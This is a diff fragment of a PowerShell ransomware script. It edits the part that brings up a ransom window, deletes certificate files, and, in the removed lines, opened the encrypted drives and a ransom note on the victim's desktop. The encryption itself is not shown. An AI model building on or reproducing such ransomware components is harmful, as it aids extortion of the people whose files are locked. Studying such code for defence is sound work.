@@ -311,15 +311,6 @@ Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
-function EncryptedFiles 
-{ 
-# $Source = "w:\" # replace the path with the folders you encrypted
-explorer w:
-explorer x:
-explorer y:
-explorer z:
-} 
-
 function RandomBacklight {
 $random = New-Object System.Random 
 switch ($random.Next(9)) { 
@@ -446,9 +437,7 @@ Remove-Item c:\windows\temp\x.cer
 
 Remove-Item C:\temp\cert.cer
 
-Start-Sleep 3
-EncryptedFiles
-notepad c:/users/$env:USERNAME/desktop/ransom.txt
+
 
 # restart-computer -force
 
